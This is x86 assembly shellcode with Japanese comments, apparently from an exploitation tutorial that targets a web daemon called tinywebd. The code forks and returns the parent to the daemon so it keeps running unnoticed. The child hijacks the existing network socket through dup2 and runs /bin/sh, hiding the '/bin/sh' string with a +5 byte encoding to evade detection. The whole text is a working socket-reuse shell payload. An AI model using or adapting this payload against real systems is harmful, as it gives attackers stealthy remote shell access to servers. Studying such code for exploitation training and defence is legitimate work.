BITS 32 

   push BYTE 0x02    ; forkはシステムコール#2 
   pop eax 
   int 0x80          ; フォーク後、子プロセスのeax == 0
   test eax, eax 
   jz child_process  ; 子プロセスの場合、シェルを起動する。

      ; 親プロセスの場合、tinywebdを復元する。
   lea ebp, [esp+0x68]  ; ebpを復元する。
   push 0x08048fb7      ; 戻りアドレス
   ret                  ; リターン 

child_process: 
    ; 既存のソケットを再利用する。
   lea edx, [esp+0x5c]  ; new_sockfdのアドレスをedxに設定する。
   mov ebx, [edx]       ; new_sockfdの値をebxに設定する。
   push BYTE 0x02 
   pop ecx          ; ecxは2から開始
   xor eax, eax 
dup_loop: 
   mov BYTE al, 0x3F ; dup2システムコールは63番
   int 0x80          ; dup2(c, 0) 
   dec ecx           ; 0へのカウントダウン
   jns dup_loop      ; 符号フラグがセットされていない場合、ecxは負ではない。

; execve(const char *filename, char *const argv [], char *const envp[]) 
   mov BYTE al, 11   ; execveはシステムコール11番
   push 0x056d7834   ; "//sh\x00"の各バイトに+5を加算した値をスタックにプッシュする。
   push 0x736e6734   ; "/bin"の各バイトに+5を加算した値をスタックにプッシュする。
   mov ebx, esp      ; コード化した"/bin/sh"のアドレスをebxに設定する。

;int3 ; 文字列復元前のブレークポイント（デバッグ時以外は不要）

   push BYTE 0x8     ; 8バイトを復元する必要がある
   pop edx 
decode_loop: 
   sub BYTE [ebx+edx], 0x5 
   dec edx 
   jns decode_loop 

;int3 ; 文字列復元後のブレークポイント（デバッグ時以外は不要）

   xor edx, edx 
   push edx          ; 32ビットのnull終端をスタックにプッシュする。
   mov edx, esp      ; これはenvpの空配列となる。
   push ebx          ; スタック上のnull終端の上に文字列アドレスをプッシュする。
   mov ecx, esp      ; これは文字列ポインタを伴うargv配列となる。
   int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL]) 
